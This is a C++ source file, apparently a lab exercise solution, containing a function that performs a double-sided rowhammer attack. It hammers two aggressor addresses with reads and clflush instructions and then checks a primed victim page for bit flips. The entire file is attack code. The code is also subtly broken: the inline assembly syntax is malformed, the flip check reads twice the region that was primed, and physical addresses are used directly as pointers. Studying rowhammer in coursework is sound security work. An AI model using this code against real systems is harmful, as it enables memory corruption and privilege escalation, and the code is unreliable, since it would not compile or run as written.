#include "../shared.hh"
#include "../params.hh"

/*
 * hammer_addresses
 *
 * Performs a double-sided rowhammer attack on a given victim address,
 * given two aggressor addresses.
 *
 * HINT 1: Be patient! Bit-flips won't happen every time.
 *
 * Input: victim address, and two attacker addresses (all *physical*)
 * Output: True if any bits have been flipped, false otherwise.
 *
 */
bool hammer_addresses(uint64_t vict_phys_addr, uint64_t attacker_phys_addr_1, uint64_t attacker_phys_addr_2) {
  bool foundFlip = false; 

  // prime
  uint8_t * vict_phys_addr_ptr = reinterpret_cast<uint8_t *>(vict_phys_addr);
  // row size in dram is 8KB
  memset(vict_phys_addr_ptr, 0xFF, PAGE_SIZE);
  
  int num_reads = HAMMERS_PER_ITER;
  volatile uint8_t * attacker_phys_addr_1_ptr = reinterpret_cast<volatile uint8_t *>(attacker_phys_addr_1);
  volatile uint8_t * attacker_phys_addr_2_ptr = reinterpret_cast<volatile uint8_t *>(attacker_phys_addr_2);

  while (num_reads-- > 0 ) {
    asm volatile(
      "mov (%0) %rax;\n\t"
      "mov (%1) %rax;\n\t"
      "clflush (%0);\n\t"
      "clflush (%1);\n\t"
      :
      : "r" (attacker_phys_addr_1_ptr) "r" (attacker_phys_addr_2_ptr)
      : "memory"
    );
  }

  uint64_t number_of_bitflips_in_target = 0;
  for (uint64_t index = 0; index < 1ULL << (PAGE_SIZE_BITS + 1); ++index) {
      if (vict_phys_addr_ptr[index] != 0xFF) {
        foundFlip = true;
      }
  }
  return foundFlip; 
}

